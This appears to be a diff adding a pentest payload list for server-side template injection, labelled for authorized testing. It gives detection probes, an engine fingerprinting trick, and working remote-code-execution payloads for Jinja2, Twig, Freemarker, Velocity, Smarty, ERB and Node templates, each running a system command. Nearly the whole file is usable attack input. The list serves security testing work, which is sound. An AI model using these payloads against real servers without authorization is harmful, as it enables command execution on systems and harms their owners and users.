@@ -1,0 +1,47 @@
+# Server-Side Template Injection (SSTI) — canonical payloads (authorized testing)
+# Full sets: ../vendor/PayloadsAllTheThings/Server Side Template Injection/
+# Step 1: detection via math. Step 2: fingerprint the engine. Step 3: RCE per engine.
+
+## --- Detection (if it returns 49 → probably SSTI) ---
+{{7*7}}
+${7*7}
+#{7*7}
+<%= 7*7 %>
+{7*7}
+${{7*7}}
+@(7*7)
+#{ 7*7 }
+*{7*7}
+
+## --- Distinguishing {{7*'7'}} ---
+{{7*'7'}}        # Jinja2 → 7777777 ; Twig → 49
+
+## --- Jinja2 / Python (Flask) ---
+{{config}}
+{{config.items()}}
+{{''.__class__.__mro__[1].__subclasses__()}}
+{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
+{{cycler.__init__.__globals__.os.popen('id').read()}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+
+## --- Twig (PHP) ---
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+{{['id']|filter('system')}}
+
+## --- Freemarker (Java) ---
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
+${"freemarker.template.utility.Execute"?new()("id")}
+
+## --- Velocity (Java) ---
+#set($e="e")$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")
+
+## --- Smarty (PHP) ---
+{system('id')}
+{php}system('id');{/php}
+
+## --- Ruby ERB ---
+<%= system("id") %>
+<%= `id` %>
+
+## --- Pug / Handlebars / Nunjucks (Node) — see PayloadsAllTheThings for RCE chains ---
+{{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}
